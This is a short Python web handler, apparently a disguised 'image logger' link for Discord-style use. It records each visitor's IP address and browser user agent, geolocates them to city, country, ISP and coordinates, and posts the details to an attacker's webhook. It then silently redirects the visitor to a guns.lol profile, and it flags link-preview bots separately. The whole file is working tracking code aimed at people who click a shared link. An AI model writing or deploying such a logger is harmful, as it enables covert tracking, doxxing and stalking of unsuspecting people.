from http.server import BaseHTTPRequestHandler
import requests
import json

# 1. MAKE SURE YOUR WEBHOOK IS IN THE QUOTES
WEBHOOK_URL = "YOUR_ACTUAL_WEBHOOK_URL_HERE"
REDIRECT_URL = "https://guns.lol/sleezyyyyyy"

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        ua = self.headers.get('User-Agent', '')
        ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
        
        # Aggressive bot detection for "Link Sent" alerts
        is_bot = any(bot in ua for bot in ["Discordbot", "TelegramBot", "Twitterbot", "facebookexternalhit"])
        
        try:
            geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
            city = geo.get('city', 'Unknown')
            country = geo.get('country', 'Unknown')
            isp = geo.get('isp', 'Unknown')
            coords = f"{geo.get('lat', '0')}, {geo.get('lon', '0')}"
        except:
            city = country = isp = coords = "Error fetching data"

        # Change title and color based on bot vs human
        if is_bot:
            title = "📤 Image Logger - Link Sent"
            color = 3447003  # Blue
        else:
            title = "🎯 New Visitor Located!"
            color = 16711680  # Red

        payload = {
            "embeds": [{
                "title": title,
                "color": color,
                "fields": [
                    {"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True},
                    {"name": "📍 Location", "value": f"{city}, {country}", "inline": True},
                    {"name": "🏢 Provider/ISP", "value": isp, "inline": False},
                    {"name": "🗺️ Coordinates", "value": coords, "inline": False},
                    {"name": "📱 Device", "value": f"```{ua[:150]}```", "inline": False}
                ],
                "footer": {"text": "Guns.lol Redirect Logger"}
            }]
        }

        requests.post(WEBHOOK_URL, json=payload, timeout=5)

        self.send_response(302)
        self.send_header('Location', REDIRECT_URL)
        self.end_headers()
